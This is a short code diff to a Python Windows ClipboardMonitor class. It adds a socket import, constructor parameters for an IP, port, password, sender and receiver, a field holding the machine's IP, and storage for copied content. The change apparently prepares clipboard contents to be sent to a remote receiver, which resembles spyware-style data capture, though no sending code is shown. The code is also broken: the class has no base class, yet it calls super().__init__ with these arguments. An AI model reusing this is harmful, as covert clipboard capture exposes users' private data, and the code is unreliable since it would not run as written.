@@ -6,8 +6,8 @@ from dataclasses import dataclass
 import win32gui
 import  win32api
 import ctypes
+import socket
    
-
 
 class ClipboardMonitor:
 
@@ -20,13 +20,21 @@ class ClipboardMonitor:
             self.value = value
         
     
-    def __init__(self, on_text, on_image, on_file):
+    def __init__(self, on_text, on_image, on_file, ip, port, password, sender, receiver):
        
         self._on_text=on_text
         self._on_image=on_image
         self._on_files=on_file
-       
+
+        self.user = socket.gethostbyname(socket.gethostname())
+
+        self._copied_content_size = int()
+        self._copied_content = str()
+
+        super().__init__(ip, port, password, sender, receiver)
+
         print("clipboard thread started..")
+        self.run()
     
     
     def _create_base_window(self) -> int:
